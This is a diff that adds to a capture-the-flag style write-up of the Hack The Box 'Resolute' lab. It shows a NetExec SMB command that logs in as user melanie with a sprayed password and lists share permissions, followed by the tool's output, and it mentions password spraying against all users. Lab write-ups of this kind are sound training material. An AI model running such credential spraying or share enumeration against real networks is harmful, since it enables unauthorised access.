@@ -171,3 +171,18 @@ SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\naoki:Wel
 This is why it is important to spray it against all users, even though the password was in `marko` account description it doesnt work on his account
 
 ## Access as `melanie`
+```python
+nxc smb resolute.megabank.local -u melanie -p 'Welcome123!' --shares              
+SMB         10.129.96.155   445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True) (Null Auth:True)
+SMB         10.129.96.155   445    RESOLUTE         [+] megabank.local\melanie:Welcome123! 
+SMB         10.129.96.155   445    RESOLUTE         [*] Enumerated shares
+SMB         10.129.96.155   445    RESOLUTE         Share           Permissions     Remark
+SMB         10.129.96.155   445    RESOLUTE         -----           -----------     ------
+SMB         10.129.96.155   445    RESOLUTE         ADMIN$                          Remote Admin
+SMB         10.129.96.155   445    RESOLUTE         C$                              Default share
+SMB         10.129.96.155   445    RESOLUTE         IPC$            READ            Remote IPC
+SMB         10.129.96.155   445    RESOLUTE         NETLOGON        READ            Logon server share 
+SMB         10.129.96.155   445    RESOLUTE         SYSVOL          READ            Logon server share
+```
+Default access on shares
+
